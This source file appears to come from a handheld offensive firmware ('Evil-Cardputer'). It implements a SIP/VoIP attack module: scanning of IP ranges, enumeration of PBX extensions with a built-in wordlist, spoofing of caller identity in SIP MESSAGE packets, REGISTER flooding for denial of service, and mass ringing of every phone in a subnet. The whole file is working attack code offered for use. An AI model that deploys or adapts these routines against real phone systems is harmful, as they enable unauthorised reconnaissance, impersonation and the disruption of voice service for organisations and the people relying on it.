/*
 * sip_attacks.cpp - SIP/VoIP Attack Module for Evil-Cardputer
 *
 * Contains:
 *   - SIP Scanner (OPTIONS scan)
 *   - SIP Extension Enumeration (INVITE)
 *   - SIP Message Spoofing
 *   - SIP REGISTER Flooding
 *   - SIP Ring All (mass INVITE)
 */

#include "sip_attacks.h"
#include "input_compat.h"
#include <M5Cardputer.h>
#include "gui/gui.h"

using LB = GUI::LegacyBridge;

// ============================================================================
// Static Variables
// ============================================================================
static WiFiUDP sipUdp;
static const uint16_t SIP_PORT     = 5060;   // port SIP cible
static const uint16_t LOCAL_SIP_EP = 5062;   // port UDP local
static char  sipBuf[600];
volatile bool sipFloodStop = false;

// ============================================================================
// Helper Functions
// ============================================================================

String genHex(uint8_t n) {
  static const char *h = "0123456789abcdef";
  String o; o.reserve(n * 2);
  for (uint8_t i = 0; i < n; ++i) {
    uint8_t v = esp_random() & 0xFF;
    o += h[v >> 4]; o += h[v & 0x0F];
  }
  return o;
}

String genBranch() { return "z9hG4bK-" + genHex(6); }
String genCallID() { return genHex(8) + "@" + WiFi.localIP().toString(); }

// ============================================================================
// UDP TX/RX Helpers
// ============================================================================

void sendSIP(const IPAddress &dst, const String &pkt) {     // open+send
  sipUdp.begin(LOCAL_SIP_EP);
  sipUdp.beginPacket(dst, SIP_PORT);
  sipUdp.write((const uint8_t*)pkt.c_str(), pkt.length());
  sipUdp.endPacket();
}

void sendSIPRaw(const IPAddress &dst, const String &pkt) {  // send only
  sipUdp.beginPacket(dst, SIP_PORT);
  sipUdp.write((const uint8_t*)pkt.c_str(), pkt.length());
  sipUdp.endPacket();
}

String readSIPResp(unsigned long tout = 500) {
  unsigned long st = millis();
  while (millis() - st < tout) {
    int len = sipUdp.parsePacket();
    if (len > 0 && len < sizeof(sipBuf)) {
      sipUdp.read(sipBuf, len); sipBuf[len] = 0;
      char *e = strchr(sipBuf, '\r'); if (!e) e = strchr(sipBuf, '\n');
      return String((char*)sipBuf, e ? e - sipBuf : len);
    }
    delay(10);
  }
  return "";
}

// ============================================================================
// Keyboard Input - UTF-8 safe
// ============================================================================

String promptInput(const char *prompt) {
  String input = "";
  LB::clear();
  LB::setTextSize(1.5);
  LB::setTextColor(TFT_GREEN, TFT_BLACK);
  LB::setCursor(5, 5);
  LB::println(prompt);
  LB::setTextColor(TFT_WHITE, TFT_BLACK);

  while (true) {
    M5Cardputer.update();
    if (M5Cardputer.Keyboard.isChange() && M5Cardputer.Keyboard.isPressed()) {
      auto k = M5Cardputer.Keyboard.keysState();
      for (char c : k.word) if (isPrintable(c)) input += c;
      if (k.del && input.length()) input.remove(input.length() - 1);
      if (k.enter && input.length()) return input;

      LB::fillRect(0, 30, 240, 16, TFT_BLACK);
      LB::setCursor(5, 30);
      LB::print(input.c_str());
      LB::display();
    }
    delay(20);
  }
}

// ============================================================================
// IP Conversion Utilities
// ============================================================================

inline uint32_t ipTo32(const IPAddress &ip) {
  return ((uint32_t)ip[0] << 24) |
         ((uint32_t)ip[1] << 16) |
         ((uint32_t)ip[2] <<  8) |
          (uint32_t)ip[3];
}

inline IPAddress ipFrom32(uint32_t v) {
  return IPAddress((v >> 24) & 0xFF,
                   (v >> 16) & 0xFF,
                   (v >>  8) & 0xFF,
                    v        & 0xFF);
}

// ============================================================================
// CIDR Parser
// ============================================================================

/*  parseTarget("10.0.0.0/24")  ou  "10.0.0.7"
 *  -> outNet    : adresse réseau
 *     outFirst/outLast : plage hôte prête à itérer                    */
bool parseTarget(const String &s, uint32_t &outNet,
                 uint32_t &outFirst, uint32_t &outLast) {
  int slash = s.indexOf('/');
  IPAddress ip; uint8_t mask = 32;
  if (slash >= 0) {
    mask = s.substring(slash + 1).toInt();
    if (mask > 32) return false;
    if (!ip.fromString(s.substring(0, slash))) return false;
  } else {
    if (!ip.fromString(s)) return false;
  }

  uint32_t ip32   = ipTo32(ip);                       // *** correct endian ***
  uint32_t mask32 = (mask == 0) ? 0 : (0xFFFFFFFFUL << (32 - mask));
  outNet          = ip32 & mask32;

  if (mask == 32) {                                   // /32 = hôte unique
    outFirst = outLast = ip32;
  } else {
    outFirst = outNet + 1;
    outLast  = (outNet | (~mask32)) - 1;              // exclut broadcast
  }
  return true;
}

// ============================================================================
// 1. SIP OPTIONS SCAN
// ============================================================================

void sipScan() {
  inMenu = false;

  String tgt = promptInput("IP ou CIDR > ");
  if (tgt.isEmpty()) { waitAndReturnToMenu("Cancelled"); return; }

  uint32_t net, first, last;
  if (!parseTarget(tgt, net, first, last)) { waitAndReturnToMenu("Bad IP/CIDR"); return; }

  sipUdp.begin(LOCAL_SIP_EP);
  uint16_t ok = 0, ko = 0;

  for (uint32_t h = first; h <= last; ++h) {
    if (InputCompat::isBackPressed()) break;
    IPAddress dst = ipFrom32(h);

    String pkt = "OPTIONS sip:" + dst.toString() + " SIP/2.0\r\n"
                 "Via: SIP/2.0/UDP " + WiFi.localIP().toString() +
                 ";branch=" + genBranch() + ";rport\r\n"
                 "From: \"Evil-Cardputer\" <sip:scan@" + WiFi.localIP().toString() + ">;tag=1\r\n"
                 "To: <sip:" + dst.toString() + ">\r\n"
                 "Call-ID: " + genCallID() + "\r\nCSeq: 1 OPTIONS\r\n"
                 "Max-Forwards: 70\r\nUser-Agent: Evil-Cardputer/1.4.3\r\n"
                 "Content-Length: 0\r\n\r\n";

    sendSIPRaw(dst, pkt);

    String resp = readSIPResp();
    (resp.startsWith("SIP/2.0 200") ? ok : ko)++;

    Serial.printf("[SIP-RX] %s - %s\n", dst.toString().c_str(), resp.c_str());
    LB::fillRect(0, 100, 240, 12, menuBackgroundColor);
    LB::setCursor(5, 100);
    LB::printf("OK:%u  KO:%u", ok, ko);
    LB::display();
  }
  sipUdp.stop();
  waitAndReturnToMenu("Scan done  OK:" + String(ok) + "  KO:" + String(ko));
}

// ============================================================================
// 2. SIP Extension Enumeration (INVITE)
// ============================================================================

void sipEnumExtensions() {
  /* ---------- saisie paramètres ---------- */
  IPAddress pbx;
  String ip = promptInput("PBX IP > ");
  if (!pbx.fromString(ip)) { waitAndReturnToMenu("Bad IP"); return; }

  String mode = promptInput("Mode: 1=Range  2=Wordlist > ");

  /* ---------- préparation affichage ---------- */
  constexpr int  lineH   = 14;
  constexpr int  yStart  = 16;
  const     int  yMax    = LB::height() - lineH;
  int yCursor           = yStart;

  LB::clear();
  LB::setTextSize(1.5);
  LB::setTextColor(TFT_GREEN, TFT_BLACK);
  LB::setCursor(5, 5);
  LB::println("Enum running...");

  LB::startWrite();

  uint16_t found = 0;

  auto printLine = [&](const String& txt)
  {
    if (yCursor > yMax) {
      LB::scroll(0, -lineH);
      yCursor = yMax;
      LB::fillRect(0, yCursor, LB::width(), lineH, TFT_BLACK);
    }
    LB::setCursor(5, yCursor);
    LB::setTextColor(TFT_WHITE, TFT_BLACK);
    LB::println(txt.c_str());
    yCursor += lineH;
  };

  /* ---------- test d'une extension ---------- */
  auto sendInviteAndCheck = [&](const String& ext) {
    String pkt = "INVITE sip:" + ext + "@" + ip + " SIP/2.0\r\n"
                 "Via: SIP/2.0/UDP " + WiFi.localIP().toString() +
                 ";branch=" + genBranch() + "\r\n"
                 "From: \"Enum\" <sip:enum@" + WiFi.localIP().toString() + ">;tag=2\r\n"
                 "To: <sip:" + ext + "@" + ip + ">\r\n"
                 "Call-ID: " + genCallID() + "\r\n"
                 "CSeq: 1 INVITE\r\n"
                 "Contact: <sip:enum@" + WiFi.localIP().toString() + ">\r\n"
                 "Max-Forwards: 70\r\nContent-Length: 0\r\n\r\n";

    sendSIP(pbx, pkt);
    String r = readSIPResp(500);

    /* garde uniquement la première ligne ex : "SIP/2.0 401 Unauthorized" */
    String status = r.substring(0, r.indexOf('\r') >= 0 ? r.indexOf('\r')
                                                        : r.indexOf('\n'));

    if (status.startsWith("SIP/2.0 401") ||
        status.startsWith("SIP/2.0 403") ||
        status.startsWith("SIP/2.0 407"))
    {
      found++;
      Serial.printf("[+] EXT %s exists  ->  %s\n", ext.c_str(), status.c_str());
      printLine("Found " + ext + " -> " + status);
    }
  };

  /* ---------- mode 1 : plage numérique ---------- */
  if (mode == "1") {
    uint16_t deb = promptInput("Start ext > ").toInt();
    uint16_t fin = promptInput("End ext > ").toInt();
    for (uint16_t e = deb; e <= fin; ++e) { sendInviteAndCheck(String(e)); delay(40); }

  /* ---------- mode 2 : word-list intégrée ---------- */
  } else if (mode == "2") {
    static const char* const extList[] = {
      /* Asterisk / FreePBX */ "100","101","102","199","200","201","202","299",
      "*97","*98","*43","*60","*65","*69","#","555","700","701",
      /* 3CX */ "7000","7777","8888","9999",
      /* Cisco CUCM */ "5900","5901","7777","9900","9999",
      /* Yeastar */ "1000","1001","1002",
      /* noms fréquents */ "admin","operator","reception","support",
      "voicemail","alice","bob","guest","test","accueil", nullptr
    };
    for (uint8_t i = 0; extList[i]; ++i) { sendInviteAndCheck(extList[i]); delay(40); }

  } else {
    LB::endWrite();
    waitAndReturnToMenu("Invalid mode");
    return;
  }

  /* ---------- fin ---------- */
  LB::endWrite();
  waitAndReturnToMenu(String("Enum done – ") + found + " valid");
}

// ============================================================================
// 3. SIP Message Spoofing
// ============================================================================

void sipSpoofMessage() {
  inMenu = false;
  IPAddress pbx; String ip = promptInput("PBX IP > "); if (!pbx.fromString(ip)) {
    waitAndReturnToMenu("Bad IP");
    return;
  }
  String dst = promptInput("Dest ext > "), fake = promptInput("Caller name > "), txt = promptInput("Text > ");
  String body = txt + "\r\n";
  String pkt = "MESSAGE sip:" + dst + "@" + ip + " SIP/2.0\r\n"
               "Via: SIP/2.0/UDP " + WiFi.localIP().toString() + ";branch=" + genBranch() + "\r\n"
               "From: \"" + fake + "\" <sip:" + fake + "@example.com>;tag=3\r\n"
               "To: <sip:" + dst + "@" + ip + ">\r\n"
               "Call-ID: " + genCallID() + "\r\nCSeq: 1 MESSAGE\r\nMax-Forwards: 70\r\n"
               "Content-Type: text/plain\r\nContent-Length: " + String(body.length()) + "\r\n\r\n" + body;
  sendSIP(pbx, pkt);
  String resp = readSIPResp(); waitAndReturnToMenu(resp == "" ? "No answer" : resp);
}

// ============================================================================
// 4. SIP REGISTER Flood
// ============================================================================

void sipFlood() {
  inMenu = false; sipFloodStop = false;

  String tgt = promptInput("IP ou CIDR > ");
  if (tgt.isEmpty()) { waitAndReturnToMenu("Cancelled"); return; }

  uint32_t net, first, last;
  if (!parseTarget(tgt, net, first, last)) { waitAndReturnToMenu("Bad IP/CIDR"); return; }

  uint8_t pps = promptInput("Pkts/sec (1-50) > ").toInt();
  uint32_t delayUS = 1000000UL / pps;

  sipUdp.begin(LOCAL_SIP_EP);
  uint32_t tot = 0;

  LB::clear();
  LB::println("FLOOD - BACKSPACE to stop");
  LB::display();

  for (uint32_t h = first; h <= last && !sipFloodStop; ++h) {
    IPAddress dst = ipFrom32(h);

    String pkt = "REGISTER sip:" + dst.toString() + " SIP/2.0\r\n"
                 "Via: SIP/2.0/UDP " + WiFi.localIP().toString() +
                 ";branch=" + genBranch() + ";rport\r\n"
                 "From: <sip:flood@" + WiFi.localIP().toString() + ">;tag=F\r\n"
                 "To: <sip:flood@" + dst.toString() + ">\r\n"
                 "Call-ID: " + genCallID() + "\r\nCSeq: 1 REGISTER\r\n"
                 "Contact: <sip:flood@" + WiFi.localIP().toString() + ">\r\n"
                 "Max-Forwards: 70\r\nContent-Length: 0\r\n\r\n";

    unsigned long t0 = micros();
    while ((micros() - t0) < 1000000UL && !sipFloodStop) {
      sendSIPRaw(dst, pkt); tot++;
      delayMicroseconds(delayUS);
      M5Cardputer.update();
      if (InputCompat::isBackPressed()) sipFloodStop = true;
    }
    LB::fillRect(0, 90, 240, 12, menuBackgroundColor);
    LB::setCursor(5, 90);
    LB::printf("%s tot:%u", dst.toString().c_str(), tot);
    LB::display();
  }
  sipUdp.stop();
  waitAndReturnToMenu(sipFloodStop ? "Flood aborted" : "Sent " + String(tot));
}

// ============================================================================
// 5. SIP Ring All
// ============================================================================

void sipRingAll() {
  inMenu = false;

  String tgt = promptInput("CIDR ex 192.168.1.0/24 > ");
  if (tgt.isEmpty()) { waitAndReturnToMenu("Cancelled"); return; }

  uint32_t net, first, last;
  if (!parseTarget(tgt, net, first, last)) { waitAndReturnToMenu("Bad CIDR"); return; }

  uint16_t ringSec = promptInput("Ring duration s (5) > ").toInt();
  if (ringSec == 0) ringSec = 5;
  bool addSDP = promptInput("Add SDP ? y/N > ").startsWith("y");

  sipUdp.begin(LOCAL_SIP_EP);
  struct CallMeta { IPAddress ip; String branch; String callid; };
  std::vector<CallMeta> dlg;

  /* ---------- burst INVITE ---------- */
  for (uint32_t h = first; h <= last; ++h) {
    IPAddress dst = ipFrom32(h);

    String branch = genBranch();
    String callid = genCallID();

    String sdp = "v=0\r\no=- 0 0 IN IP4 " + WiFi.localIP().toString() +
                 "\r\ns=Ring\r\nc=IN IP4 " + WiFi.localIP().toString() +
                 "\r\nt=0 0\r\nm=audio 0 RTP/AVP 0\r\n";

    String pkt = "INVITE sip:" + dst.toString() + "@" + dst.toString() + " SIP/2.0\r\n"
                 "Via: SIP/2.0/UDP " + WiFi.localIP().toString() +
                 ";branch=" + branch + ";rport\r\n"
                 "From: \"Broadcast\" <sip:ring@" + WiFi.localIP().toString() + ">;tag=R\r\n"
                 "To: <sip:" + dst.toString() + "@" + dst.toString() + ">\r\n"
                 "Call-ID: " + callid + "\r\nCSeq: 1 INVITE\r\n"
                 "Max-Forwards: 70\r\nContact: <sip:ring@" + WiFi.localIP().toString() + ">\r\n"
                 "User-Agent: Evil-Cardputer/1.4.3\r\n" +
                 (addSDP ? String("Content-Type: application/sdp\r\n") : "") +
                 "Content-Length: " + String(addSDP ? sdp.length() : 0) + "\r\n\r\n" +
                 (addSDP ? sdp : "");

    sendSIPRaw(dst, pkt);
    dlg.push_back({dst, branch, callid});
    delay(2);     // ≈ 500 pps
  }

  /* ---------- temporisation ---------- */
  unsigned long stopAt = millis() + ringSec * 1000UL;
  while (millis() < stopAt && !InputCompat::isBackPressed()) delay(100);

  /* ---------- CANCEL ---------- */
  for (auto &d : dlg) {
    String cancel = "CANCEL sip:" + d.ip.toString() + "@" + d.ip.toString() + " SIP/2.0\r\n"
                    "Via: SIP/2.0/UDP " + WiFi.localIP().toString() + ";branch=" + d.branch + ";rport\r\n"
                    "From: \"Broadcast\" <sip:ring@" + WiFi.localIP().toString() + ">;tag=R\r\n"
                    "To: <sip:" + d.ip.toString() + "@" + d.ip.toString() + ">\r\n"
                    "Call-ID: " + d.callid + "\r\nCSeq: 1 CANCEL\r\n"
                    "Max-Forwards: 70\r\nContent-Length: 0\r\n\r\n";
    sendSIPRaw(d.ip, cancel);
    delay(1);
  }
  sipUdp.stop();
  waitAndReturnToMenu("RingAll done (" + String(dlg.size()) + " INVITE)");
}
